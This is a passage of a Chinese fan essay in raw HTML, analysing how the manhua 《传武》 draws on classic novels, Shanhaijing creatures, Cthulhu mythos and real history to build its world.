data-private-watermark-src=\"\"></p>\n<h2><i>目录</i></h2>\n<p><b><i>引子</i></b></p>\n<p><b><i>《传武》中的神话设定</i></b></p>\n<p><i>1.《西游记》观音小分队的细节</i></p>\n<p><i>2.《封神演义》红尘仙的世俗依靠</i></p>\n<p><i>3.《水浒传》故事背后的故事</i></p>\n<p><i>4.漫画背后的微缩历史</i></p>\n<p><b><i>《传武》中的山海经设定</i></b></p>\n<p><i>1.仁兽驺虞的变态之路</i></p>\n<p><i>2.雁门关外的火凤燎原</i></p>\n<p><i>3.青龙背负的四大灾星</i></p>\n<p><b><i>《传武》中的克苏鲁设定</i></b></p>\n<p><i>1.黄衣之王与他的黄沙眷属</i></p>\n<p><i>2.克苏鲁神话外的克苏鲁</i></p>\n<p><b><i>《传武》中的戏剧化设定</i></b></p>\n<p><i>1.二百年一轮的庄周梦蝶</i></p>\n<p><i>2.樊家的王之宝库</i></p>\n<p><i>3.六道轮回间的相生相克</i></p>\n<p><b><i>个人感想</i></b></p>\n<p><br></p>\n<hr>\n<p><br></p>\n<h2><b>引子</b></h2>\n<p>无论怎么评价，传武注定是一部难以简单概括的作品，这并不是说传武的故事太过复杂，而是从整体的阅读体验来说的；就我个人而言，我一共系统的阅读过三次《传武》；第一次是跟随连载，大概从第一部的白骨洞剧情线一直跟到现在，回过头来看，中间确实会有出现跳戏或者自以为读懂其实不然的情况出现；不过抛开当时对部分细节的错误理解，《传武》也是一部初体验非常爽快的漫画；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-185a3830654f485e0640b2f94588cd66_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1158\" data-rawheight=\"386\" data-watermark=\"watermark\" data-original-src=\"v2-185a3830654f485e0640b2f94588cd66\" data-watermark-src=\"v2-821e062317d4f571c50fa31c25fd574a\" data-private-watermark-src=\"v2-5cb568a2186a5ebb92985600ffff268e\"></p>\n<p>第二次就是走的我个人的拉片流程，建立了Excel表格，对漫画中出现的所有的各大门派，各大势力，绝学，法器，红尘仙，山海种，天灾；都做了简单的归类整理，并标注每件事发生的相关剧情信息；这一次我得出的结论是：传武中的故事和架构是要比我想象的更加严谨合理的；剧情其实也并不是我一开始认为的纯线性平铺直叙；而是不同的线在一开始就交织并行了，虽说不上草蛇灰线，但确实处处有伏笔；所有中期出现的关键剧情其实回过头去看在早期也都有隐晦暗示，只不过之前的剧情发展太慢，导致这些优点并不够明显；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3974d99f264c5ae79766b95ad6a7bf66_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"294\" data-watermark=\"watermark\" data-original-src=\"v2-3974d99f264c5ae79766b95ad6a7bf66\" data-watermark-src=\"v2-f5ea0270470339ce7bd2757a535f66ff\" data-private-watermark-src=\"\"></p>\n<p>第三次是在QQ群看了星云老师七百多页的剧透之后，去对照之前自己做的那些整理，发现绝大多数是还是能够对上的，而一些之前百思不得其解的事情也得到了解答；就此我认为我对两部传武有了一个较为粗浅的认识；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cfcfb37aebebdf2b3702926f17d53ce9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"988\" data-rawheight=\"394\" data-watermark=\"watermark\" data-original-src=\"v2-cfcfb37aebebdf2b3702926f17d53ce9\" data-watermark-src=\"v2-a0b00510ea514cc543d182180ebd4651\" data-private-watermark-src=\"\"></p>\n<h2>《传武》中的神话设定</h2>\n<p>传武中出现最多的，或者说给普通读者最多共鸣的，往往就是传武中出现的那些神话元素，这些元素包括但不限于小说《西游记》；《封神演义》以及《搜神记》《聊斋志异》等志怪小说；这些神话设定一方面丰富了《传武》中此方世界信仰的丰富程度，也在很大一方面降低了部分读者的阅读门槛；使得普通读者在遇到一些细节彩蛋时，也能感受到亲切；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-73d78e8e239c0ad9b844a308b50f09f3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"321\" data-watermark=\"watermark\" data-original-src=\"v2-73d78e8e239c0ad9b844a308b50f09f3\" data-watermark-src=\"v2-7801d622463f55458f49a8c9a0aa192c\" data-private-watermark-src=\"\"></p>\n<p><b>1.《西游记》观音小分队的细节</b></p>\n<p>传武中出现的神话设定首屈一指的就是小说《西游记》；由于《传武》中与山阴合作的降世神明都是上界的观音（慈航）选拔的，所以不可避免的这些出现的角色或多或少都和观音或者西游记有一定的联系；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e0bc4892678fce3601b5bcb502a8a298_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"863\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-e0bc4892678fce3601b5bcb502a8a298\" data-watermark-src=\"v2-2b5b4012b2e213634e345b0b1b34055a\" data-private-watermark-src=\"\"></p>\n<p>包括但不仅限于在泰安降临的惠安尊者木吒，潍坊的广目天王魔礼寿（原型出自封神）；滨州的灵感大王；淄州的布袋罗汉惧留孙（原型出自封神）；聊城的伏虎罗汉；东阿的慈航道人观世音；天牢中的百目道人；以及严华绝学枯木逢春的祖师地仙镇元子；上清道的祖师清源妙道真君；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cb431606c2bcc3e0126ff67b7dde4809_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"368\" data-watermark=\"watermark\" data-original-src=\"v2-cb431606c2bcc3e0126ff67b7dde4809\" data-watermark-src=\"v2-9a879e851d1466ff2894b137c6389cc0\" data-private-watermark-src=\"\"></p>\n<p>木吒的绝学是纸人法体以及化形出的三十六路天罡刀；这天罡刀就是在《西游记》原著中为帮助唐僧师徒收服红孩儿；木吒向父亲李天王借用的三十六把天罡刀；灵感大王在滨州与六合帮交手前和《西游记》中一样都布置了利于自己的环境；镇元子在《西游记》中也是依靠观音的帮助才使得人参果树起死回生；反而观音的延伸绝学千鬼横行按照星云老师的说法是发现自己的肉有驯服鬼怪的作用，原型更像是传说中的度母观音；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d1996bc79177e5a02262193bd413c567_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"452\" data-watermark=\"watermark\" data-original-src=\"v2-d1996bc79177e5a02262193bd413c567\" data-watermark-src=\"v2-36f77cbc1c98f585f7695104261c2620\" data-private-watermark-src=\"\"></p>\n<p>可以说观音小分队承担了拉近传武世界与现实世界距离的作用；就好比有的人你很多年前就认识，但《传武》给你机会看了他不为人知的另一面；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2e869a3d33b70e55af278a299acb07e2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"552\" data-watermark=\"watermark\" data-original-src=\"v2-2e869a3d33b70e55af278a299acb07e2\" data-watermark-src=\"v2-d734ad5eeb88d92733994767525e5b6a\" data-private-watermark-src=\"\"></p>\n<p><b>2.《封神演义》红尘仙的世俗依靠</b></p>\n<p>和《西游记》中的角色紧紧围绕降世观音不同，《封神演义》中出现的神则更多的对应上方的各位仙神；比如惧留孙就曾提到过元始天尊以及玉虚宫；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-19e551802975d77c33b3efccf0f7a089_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"329\" data-watermark=\"watermark\" data-original-src=\"v2-19e551802975d77c33b3efccf0f7a089\" data-watermark-src=\"v2-02c92911d40dbbf843b4bf67b088257e\" data-private-watermark-src=\"\"></p>\n<p>《封神演义》可以说承担了《传武》中大部分的神明体系；这一体系不仅体现在降世神明的口口相传中；哪怕地上的五行门，上清派，都多多少少的变成了这一体系下的衍生物；《传武》中有很多体制；上界的神魔体制；此方世界的六道体制；大汉的世家体制；大唐的山神土地制；大晋的城隍天牢体制；没有规矩不成方圆，神魔小说中必须有一个规矩去划定尺度以至于剧情不陷于无敌对无敌的崩坏泥沼；但是如果规矩太过复杂或者严苛又会形成知识壁垒，把对漫画不那么了解的普通人拦在墙外；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-77ecfa2952447f058dfe11e64605f2b5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"890\" data-rawheight=\"399\" data-watermark=\"watermark\" data-original-src=\"v2-77ecfa2952447f058dfe11e64605f2b5\" data-watermark-src=\"v2-7c6edd747cdf5066ed9bf9f6db93ced0\" data-private-watermark-src=\"\"></p>\n<p>《传武》比较聪明的调动了大众的公共认识，把我们童年已经构建的那套神魔世界体系在一定的合理化加工后变成一套即能简单上手又经得起推敲琢磨的世界观；可以说，没有《传武》中国孩子心中的这个世界依然存在，而《传武》 的出现，很好的把童年的回忆和我们期待的复杂诡计叙事结合了起来；就像《封神榜》中的漫天星斗，封神之前都要在凡尘中摸爬滚打；所以当看见天上的某颗星才会觉得既崇高又亲切；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b07c386b4555e5e2115d5b6688d94b7e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"990\" data-rawheight=\"556\" data-watermark=\"watermark\" data-original-src=\"v2-b07c386b4555e5e2115d5b6688d94b7e\" data-watermark-src=\"v2-0cc665ce24de5c62eb545e9076299153\" data-private-watermark-src=\"\"></p>\n<p><b>3.《水浒传》故事背后的故事</b></p>\n<p>只从个人角度来说，我觉得在《传武》之外，星云老师肯定曾今也构建过一个以《水浒传》为框架的小说或者漫画剧本；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-38418a796ee78ed2e855d78b7df7449e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"323\" data-watermark=\"watermark\" data-original-src=\"v2-38418a796ee78ed2e855d78b7df7449e\" data-watermark-src=\"v2-4e76b251c702a05f768bac3b2bdf827b\" data-private-watermark-src=\"\"></p>\n<p>一方面《传武》中出现那些天罡地煞的形象与名字，如原本就出自水浒的没遮拦穆弘，与水浒形象相似的一丈青姚金秀，以及蓝虎；还有天牢中的昆仑奴石方尊（运气爆表）双面人杨智,小阎王罗正等；其实都有极大的可能是出自星云大佬另外构建的一个世界中的出身角色；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4d722a4438af9cfd4d9207c23f90ea9b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"343\" data-watermark=\"watermark\" data-original-src=\"v2-4d722a4438af9cfd4d9207c23f90ea9b\" data-watermark-src=\"v2-3e491b22f8542f7cc46df943bd603783\" data-private-watermark-src=\"\"></p>\n<p>另外还有传武中无处不在的两个设定：有限的一百零八个天灾成道机会，以及朝廷到处收集的星斗仙术资料与天罡地煞术的存在；这里也很想安利一下同样非常优秀的田野一洋老师的《异闻水浒传》和胡伟老师的《长安督武司》；都是在限定了绝学和世界观上限的体系中厮杀的经典漫画；虽然《传武》中因为上方世界的存在，一定程度上削弱了这些下级武人之间拼杀的惨烈；但也能感受到很多可能转瞬即逝的龙套角色，在早期应该都是有属于自己的剧情脉络的；（好比番外篇的中出现的六合帮）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fc810d5d8e62a9ba9b28b7b7f50c6cc8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"980\" data-rawheight=\"503\" data-watermark=\"watermark\" data-original-src=\"v2-fc810d5d8e62a9ba9b28b7b7f50c6cc8\" data-watermark-src=\"v2-390d23b86c5620d341b12ec302623fe9\" data-private-watermark-src=\"\"></p>\n<p><b>4.漫画背后的微缩历史</b></p>\n<p>目前《传武》中明确设计的历史有楚汉战争（项羽和樊哙）大汉，颠覆大汉的张角；李世民打造的大唐（山神土地制度）上一世的人屠黄巢等；可以看出来如果二百年前的历史不因为上界的战争发生偏移那《传武》中此方世界的王朝与战争应该是和我们经历的历史高度趋同的；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1cc48689bae6652384149f2f4f14ed29_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"858\" data-rawheight=\"504\" data-watermark=\"watermark\" data-original-src=\"v2-1cc48689bae6652384149f2f4f14ed29\" data-watermark-src=\"v2-70dca6297ac252d3b0cd060e7d39c0d9\" data-private-watermark-src=\"\"></p>\n<p>同样的人物以及背景，虽然被赋予了各种绝学和传承，但是也和那些小说中的彩蛋一样，大大削减了读者的阅读门槛；在这一层上我们可以从一个弈棋者的视角而不是棋子的视角来盛世这些王朝之间的战争；比如祸秧道对王朝道的侵蚀，通过祸根来打造乱世；再比如生死道对其余五道的统治与经营布置；就好比上清道祖师李董说的，只有站在棋盘之上称为拿着棋子的人，才能看见《传武》世界的运行轨迹；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-11d4c67765658396cf7ca8535575ec11_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"813\" data-rawheight=\"494\" data-watermark=\"watermark\" data-original-src=\"v2-11d4c67765658396cf7ca8535575ec11\" data-watermark-src=\"v2-87204573ec997e204857a7755bbbdfad\" data-private-watermark-src=\"\"></p>\n<p>这种在完全架空的漫画中引用大量真实历史的文学产品虽然不在少数，比如《高堡奇人》，《祖国》；但像《传武》这样，如此大刀阔斧的在关键历史转折点改变历史轨迹，打造出一个在文化依然封建但是科技水平军事势力都远远高于当时社会的科技与神魔共存的世界的还是比较少见的（可能网络小说中会出现）这种生产认识与技术力的不平衡其本身就是极具戏剧性的；在传武早期还能看到完全出于农耕社会的东阿，聊城；但是到了朱雀的星轨开始这个世界就已经超出了社会自然发展的控制了；就像严华说的上界给这个世界带来了绝学，带来了星轨，带来了玉米；就像是二战后直接被划入全球化的原始社会，虽然大晋依然严格管控着这些变量，但是其中蕴含的变革的力量必将带动剧情的快速发酵；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f46703912b60b19508341b9cbe6b9e1d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"387\" data-watermark=\"watermark\" data-original-src=\"v2-f46703912b60b19508341b9cbe6b9e1d\" data-watermark-src=\"v2-a2b628a55fefb7a8c0edad5850a6588e\" data-private-watermark-src=\"\"></p>\n<h2><b>传武中的山海经设定</b></h2>\n<p>传武除了人类社会，其实还有一个比较隐晦的妖怪社会，比如一开始就说起的雁门关外的猰貐；陈兴获得的婴如；若木之种的各种形态；以及那些在千鬼横行中出现的各种天灾鬼患；其实在第一次连载阅读时期就能体验到这里的伏笔，然而在我阅读了星云老师的剧透后，还是觉得是我想的太简单了；山海种和人类之间既有合作共赢的历史（大唐的山神，大晋的山海司）也暗示了很多的种族问题以及人与自然的思辨；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-05791f1d24341abd4d64bb48c6b7799f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"885\" data-rawheight=\"381\" data-watermark=\"watermark\" data-original-src=\"v2-05791f1d24341abd4d64bb48c6b7799f\" data-watermark-src=\"v2-dd67e889e9929f436ad981eae3cc060c\" data-private-watermark-src=\"\"></p>\n<p><b>1.仁兽驺虞的变态之路</b></p>\n<p>就拿传说中的万物之红尘仙驺虞来说；《传武》中的驺虞最早出自第二卷第125条.经验之谈；是尸鬼一脉的祖先；然而在现实生活中：驺虞是中国古代传说中的一种野兽；一种虎躯猊首，白毛黑纹，尾巴很长的动物，在《神奇动物在哪里》中那个长尾巴的大猫就是驺虞。据说驺虞生性仁慈，连青草也不忍心践踏，不是自然死亡的生物不吃。被文人认为是仁慈之兽；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-64b15292759c46f004ca262bb027694f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"393\" data-watermark=\"watermark\" data-original-src=\"v2-64b15292759c46f004ca262bb027694f\" data-watermark-src=\"v2-5fe60163e54f520fced16752555ac8a3\" data-private-watermark-src=\"\"></p>\n<p>然而当驺虞第一次出现在《传武》世界观中时，他的设定则是尸鬼术的源头，世界僵尸的祖师，是怨恨人类的存在；其实我个人感觉当年此方世界的观音骑着的那只人面神兽应该就是驺虞，也只有山海种中的红尘仙才镇得住九尾狐这样的大妖；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-65ecb928bad538207efce2eefe353aa6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1037\" data-rawheight=\"401\" data-watermark=\"watermark\" data-original-src=\"v2-65ecb928bad538207efce2eefe353aa6\" data-watermark-src=\"v2-51449bfad0c18cd06327a6d3b3b335a3\" data-private-watermark-src=\"\"></p>\n<p>其实从后面水镜空间的剧情可以看出，此方世界的观音一直与山海种保持这高度的联系；但是也必然的她应该要为万物道红尘仙驺虞之后的变化附有一定的责任；根据星云老师在暗示中的线索此方世界的观音应该也是最早的绝技红尘仙（早于李董）；我们知道就大晋统治时期，王朝和鬼神的掌道者是站在大晋背后，万物和祸殃的掌道者与大晋对立，生死和奇技的掌道者则选择中立。 那么有没有可能在大汉建立之前除生死道外的五道也经历过某种对立与洗牌呢？（以上都是个人瞎猜，一切以剧情为准）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-58fba9888e986aa8eb2948df93682524_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"410\" data-watermark=\"watermark\" data-original-src=\"v2-58fba9888e986aa8eb2948df93682524\" data-watermark-src=\"v2-2a670cf2f0cfe1aecb9fd4301d2c57ad\" data-private-watermark-src=\"\"></p>\n<p><b>2.雁门关外的火凤燎原</b></p>\n<p>《传武》中雁门关外的那只猰貐一直是被不断提起确实又从未正面描述过的存在；我们读者除了知道猰貐很强（朱雀一种在送）且对人类抱有很大的恶意外，也并不知道更多的剧情了；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1cbdf63ccf70c408798cfc97005fa299_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"635\" data-watermark=\"watermark\" data-original-src=\"v2-1cbdf63ccf70c408798cfc97005fa299\" data-watermark-src=\"v2-d85adc45536d35d0853a43424bb4c707\" data-private-watermark-src=\"\"></p>\n<p>从星云老师剧透中提到的暗示来看四象各有分工，青龙负责把守天牢；白虎负责处理人形天灾；朱雀负责对敌雁门关的敌人；玄武负责游走于天下捉拿大晋潜在的威胁；其中朱雀掌握的南明离火属于《传武》八大火之一，是作者公认的规格外的存在（相当于隐形轰炸机）我简单在网上看来一下南明离火这个词；不出所料都是比较中二的设定聚合体；不结合现实中的中国历史来看，应该和《斗破苍穹》中的异火一样是特殊的火焰吧；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-90fdd0cfd1ed1c6951d85a5dd89bbb5f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"986\" data-rawheight=\"415\" data-watermark=\"watermark\" data-original-src=\"v2-90fdd0cfd1ed1c6951d85a5dd89bbb5f\" data-watermark-src=\"v2-0b11b47fa2aa5e70b1488606b208b7a9\" data-private-watermark-src=\"\"></p>\n<p>大晋要把超过四分之一的战力安排在雁门关外说明雁门关外的战争不仅仅是我们认识中的北方胡人侵扰的简单缩影，胡人方面其实也有万俟这样更明确的指代了；结合大晋用城隍制度取代了大唐的山神土地制度来看雁门关的战争可能另有隐情；个人猜测和当年山阴抽干鱼山龙脉有关；不知道现在开封天牢外的龙脉是否和鱼山龙脉有关；如果这龙脉是两个王朝之前非此即彼的关系的话，那最后作者的安排其实也能看出更多传承与发展间的取舍（不小心扯远了）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b38028b497124092a674e1b60d2e0211_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"307\" data-watermark=\"watermark\" data-original-src=\"v2-b38028b497124092a674e1b60d2e0211\" data-watermark-src=\"v2-11029d59eca9b550762d4efc59677b75\" data-private-watermark-src=\"\"></p>\n<p><b>3.青龙背负的四大灾星</b></p>\n<p>宁仲背上是所谓的人类面临的四大天灾；目前已经出现的是旱；洪；疫；虽然星云老师并没有设计好，但个人认为最后一个如果要找同等级的还是兵灾更合适一点（历史上兵灾有时也算天灾）；其余如蝗灾的代表飞蝗道人，泥石流的代表石方尊已经在天牢中；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a08166982c9e2ef3e88e8f6bf109f609_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"986\" data-rawheight=\"664\" data-watermark=\"watermark\" data-original-src=\"v2-a08166982c9e2ef3e88e8f6bf109f609\" data-watermark-src=\"v2-b89f7b8af62cb666d01e1be4c49a03a6\" data-private-watermark-src=\"\"></p>\n<p>关于人类对自然灾祸的恐惧，《诗·大雅·云汉》：“旱魃为虐，如惔如焚。”孟子提到：“洚水警余”。至于疫灾的危害，我们今天更是刻骨铭心；在星云老师还提到了如果《传武》的舞台在日本那天灾也免不了类似白胡子的震震果实和核辐射这样的类型；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-24b60a5d1cc23ac08e2e77d6a6bff3b9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"862\" data-rawheight=\"498\" data-watermark=\"watermark\" data-original-src=\"v2-24b60a5d1cc23ac08e2e77d6a6bff3b9\" data-watermark-src=\"v2-cd9819948a666ec58a6b8a64c718dcb9\" data-private-watermark-src=\"\"></p>\n<p>在《传武》世界观中天灾被限定为了一百零八种（部分龙套星云老师说不屑取名字），目前在天牢中与宁仲交手的有名有姓的天灾共有二十位：百目道人-百目；异食经-虢也；纸艺人-朱平；奈何手-道去 奈何手； 移山略缺-沈冲；三世神经-三首；活僵-亓官氏；五想欲-释寂悟 ；六度三绝-吾道济 ；蝗中躯-飞蝗道人；小阎王 -罗正；六臂尊者-迦叶；昆仑奴-石方尊；兽王-閺虎；缝尸匠-天残；红妆女-厉鬼；散发鬼；画郎书仙-不笑书生；纸人-朱褶；杨智-双面人；加上之前就提到的白骨洞的白骨精和李存孝；如果再加上山阴的百足等目前出现的天灾，目前应该有约二十五位天灾了；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-510b964bc9ee0968a38c56ca40964a18_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"927\" data-rawheight=\"627\" data-watermark=\"watermark\" data-original-src=\"v2-510b964bc9ee0968a38c56ca40964a18\" data-watermark-src=\"v2-a88b0448dbd623260fffa0d8073cc03d\" data-private-watermark-src=\"\"></p>\n<h2><b>传武中的克苏鲁设定</b></h2>\n<p>《传武》中的一大两点就是把传统神话中的旧神和克苏鲁神话中的外神巧妙结合；将原本的一个故事，通过世界观的调整，变成不同风格的多个版本；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-cdfc5db79c792872c37c29a54d58f365_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"233\" data-watermark=\"watermark\" data-original-src=\"v2-cdfc5db79c792872c37c29a54d58f365\" data-watermark-src=\"v2-b66cb765b018264f5ed413653963319e\" data-private-watermark-src=\"\"></p>\n<p><b>1.黄衣之王与他的黄沙眷属</b></p>\n<p>黄衣之王哈斯塔，是克苏鲁神话中不可描述的旧日支配者，是克苏鲁的兄弟，也是克苏鲁的死敌；其实黄衣之王的设定是要早于克苏鲁神话的；罗伯特·W·钱伯斯在1895年出版的《黄衣之王》中就已经创造了这个角色，不过当创作克苏鲁神话的作者洛夫克拉夫特读到了黄衣之王这个设定时，他觉得这个角色简直就是为了克苏鲁世界创造的；于是黄衣之王也成立旧日支配者之一；在克苏鲁神话中，洛夫克拉夫特把他安排成了克苏鲁的死敌；不过在《传武》中他们属于同一阵营；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4f1bbcd53f24d42864725de85ac1f82b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"987\" data-rawheight=\"476\" data-watermark=\"watermark\" data-original-src=\"v2-4f1bbcd53f24d42864725de85ac1f82b\" data-watermark-src=\"v2-9c83fd468473c8c33d3db814d23e0cde\" data-private-watermark-src=\"\"></p>\n<p>理论上黄衣之王哈斯塔的本体被困在金牛座的毕宿五附近，所以他也被称为“深空星海之主”哈斯塔在成为黄衣之王有一个印记，是哈斯塔信徒信仰的来源之一；这个印记可能就是《传武》中道标的原型之一；我个人认为这个道标就是信仰的实体化产物；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-98973b9c29e75a243e7d5e63a84d2861_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"326\" data-watermark=\"watermark\" data-original-src=\"v2-98973b9c29e75a243e7d5e63a84d2861\" data-watermark-src=\"v2-33a9a57e96657500ebfc61204e0e1a9f\" data-private-watermark-src=\"\"></p>\n<p>在《传武》此方世界的黄泉渡口一战中，酆都就因为低估了哈斯塔和他的风之眷族导致难以消灭哈斯塔的有生力量导致此方世界的崩坏，星云老师提到过：外神选择攻陷本土神系的小千世界时，为了对付那些有着不死特质的本土神明；  外神入侵小千世界前需要先拆掉这个世界的底层框架，使世界规则先变为无序；很明显此方世界地狱的崩坏就是这个计划中的第一步；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-08e8df5d15c0f65f7b07d82dc13a4c2c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"801\" data-rawheight=\"454\" data-watermark=\"watermark\" data-original-src=\"v2-08e8df5d15c0f65f7b07d82dc13a4c2c\" data-watermark-src=\"v2-1784c0f66f9104be42d625a554fd9f20\" data-private-watermark-src=\"\"></p>\n<p><b>2.克苏鲁神话外的克苏鲁</b></p>\n<p>在淄州的惧留孙为了实验信仰之力，召唤了外域邪神克苏鲁；克苏鲁是美国小说家霍华德·菲利普·洛夫克拉夫特所创造的克苏鲁神话中的存在，和哈斯塔一样是旧日支配者之一。虽然不是克苏鲁神话中地位最高的，却是最知名的，同时也是克苏鲁神话的形象代表。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-238daf55e8928f4be973e9ddba119783_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"859\" data-rawheight=\"411\" data-watermark=\"watermark\" data-original-src=\"v2-238daf55e8928f4be973e9ddba119783\" data-watermark-src=\"v2-3d965a038ed80b080baf312b0300a7b6\" data-private-watermark-src=\"\"></p>\n<p>漫画中除了克苏鲁也同样出现了克苏鲁的眷族深海种；虽然智力不高但是和哈斯塔的风之眷族一样，在《传武》世界中起到提供信仰之力的作用，正是他们源源不断的信仰才使得如克苏鲁这样的神拥有源源不断的法力与生命力；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-575618ae9270b9ec55431bc06b51f277_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"860\" data-rawheight=\"369\" data-watermark=\"watermark\" data-original-src=\"v2-575618ae9270b9ec55431bc06b51f277\" data-watermark-src=\"v2-fa703d726c592d5a06583e2055b74039\" data-private-watermark-src=\"\"></p>\n<p>在淄州一战中惧留孙通过能力暂时击败了克苏鲁的投影；克苏鲁神话中个体生命的意义更多是只是神明传承的工具，在这场神魔大战中，神明方自己都没有意识到，自己可能也在渐渐转变为这种样子，如果真是这样，那将来即使旧神赢得了战争也可能可能转化为披着传统神明外衣的克苏鲁神；所以这也是为什么凡人不应该把命运交给那些高高在上的神明的原因；（个人观点）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7675a5361ac2400122bfbe423cb69f9a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"364\" data-watermark=\"watermark\" data-original-src=\"v2-7675a5361ac2400122bfbe423cb69f9a\" data-watermark-src=\"v2-932befdadf674c3520ae37de4eb8edf6\" data-private-watermark-src=\"\"></p>\n<h2><b>传武中的戏剧化设定</b></h2>\n<p><b>1.二百年一轮的庄周梦蝶</b></p>\n<p>两百年前对邪神的感知，开启了秦无阳的传奇一生；其实中国历史上也有一位秦舞阳，他随荆轲入秦刺杀秦始皇；但是历史的记载却很少；这两位秦舞阳都一样是自信且自负的理想主义者；首先从短暂的宏观来看秦舞阳没有错，他处处顾全大局，像极了战乱时期那些追求驱虎吞狼的革命者与战略家；但是神明所化的虎，你把握不住；天道更是一个混乱的不定值；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2f034f967a44561206a95c8274df89d2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"482\" data-watermark=\"watermark\" data-original-src=\"v2-2f034f967a44561206a95c8274df89d2\" data-watermark-src=\"v2-655da31f7b70ab91319b1ecb0f44ce3a\" data-private-watermark-src=\"\"></p>\n<p>无论如何漫画中秦舞阳在淄州的黄粱一梦都算是智斗的巅峰；通过梦境共享来做到使敌人自相矛盾；这种想象力和叙事性都是指的肯定的；星云老师说秦舞阳所用的梦境仙法不属于六道中的任何一门，因为梦是这个世界原有的东西；这让我想起黄衣之王哈斯卡在选择黄印宿主时往往会选择通过梦境来进入那人的思维深处，而秦舞阳自认为救苍生的举动也正想是他戏耍严华的黄粱一梦；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-71789f107c5ac9848edb6889d529936d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"987\" data-rawheight=\"550\" data-watermark=\"watermark\" data-original-src=\"v2-71789f107c5ac9848edb6889d529936d\" data-watermark-src=\"v2-240e7f3e5f8b0acfc32c9c29c28755bb\" 